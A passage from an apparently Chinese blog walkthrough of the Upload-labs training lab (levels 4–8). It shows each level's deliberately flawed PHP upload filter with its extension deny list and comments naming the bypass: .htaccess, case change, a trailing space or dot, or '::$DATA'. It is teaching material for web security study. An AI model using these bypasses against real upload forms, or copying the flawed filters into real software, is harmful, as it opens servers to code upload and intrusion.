class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<span class="hljs-comment">//黑名单，基本上禁用了所有可能的后缀，但是.htaccess没有被禁用，所以我们考虑上传.htaccess文件，让他可以解析别的后缀为&#x27;.php&#x27;</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-comment">//去除字符串首尾处的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//取文件后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass05-‘大小写绕过’"><a href="#Upload-labs-pass05-‘大小写绕过’" class="headerlink" title="Upload-labs-pass05: ‘大小写绕过’"></a>Upload-labs-pass05: ‘大小写绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<span class="hljs-comment">//黑名单，基本禁用。</span><br>        <br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-comment">//去除字符串首尾处的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//取文件后缀</span><br>        <span class="hljs-comment">//可以对比上一关源代码，发现没有$file_ext = strtolower($file_ext);来将文件后缀转换为小写，所以我们考虑用文件后缀大写绕过，如&#x27;1.Php&#x27;</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass06-‘结尾加空格绕过’"><a href="#Upload-labs-pass06-‘结尾加空格绕过’" class="headerlink" title="Upload-labs-pass06: ‘结尾加空格绕过’"></a>Upload-labs-pass06: ‘结尾加空格绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<span class="hljs-comment">//黑名单，基本无法绕过。</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-comment">//去除字符串首尾处的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//取文件后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-comment">//可以与上一题源代码对比，发现最后没有$file_ext = trim($file_ext);来首尾去空，所以我们考虑用加空格的绕过方式。</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass07-‘结尾加点绕过’"><a href="#Upload-labs-pass07-‘结尾加点绕过’" class="headerlink" title="Upload-labs-pass07: ‘结尾加点绕过’"></a>Upload-labs-pass07: ‘结尾加点绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<span class="hljs-comment">//黑名单，基本无法绕过。</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];//去除字符串首尾处的空白字符<br>        //可以对比上一题码源，发现没有<span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);来删除文件末尾的点，所以我们考虑用加点绕过的方法，如<span class="hljs-string">&#x27;1.php.&#x27;</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, //取文件后缀<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass08-‘加-DATA绕过’"><a href="#Upload-labs-pass08-‘加-DATA绕过’" class="headerlink" title="Upload-labs-pass08: ‘加::$DATA绕过’"></a>Upload-labs-pass08: ‘加::$DATA绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<span class="hljs-comment">//黑名单，基本无法绕过</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-comment">//去除字符串首尾处的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//取文件后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-comment">//可以对比上一题码源，发现没有 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);来去除末尾的&#x27;::$DATA,所以我们考虑用加::$DATA来绕过，如&#x27;1.php::$DATA&#x27;</span><br>        <span 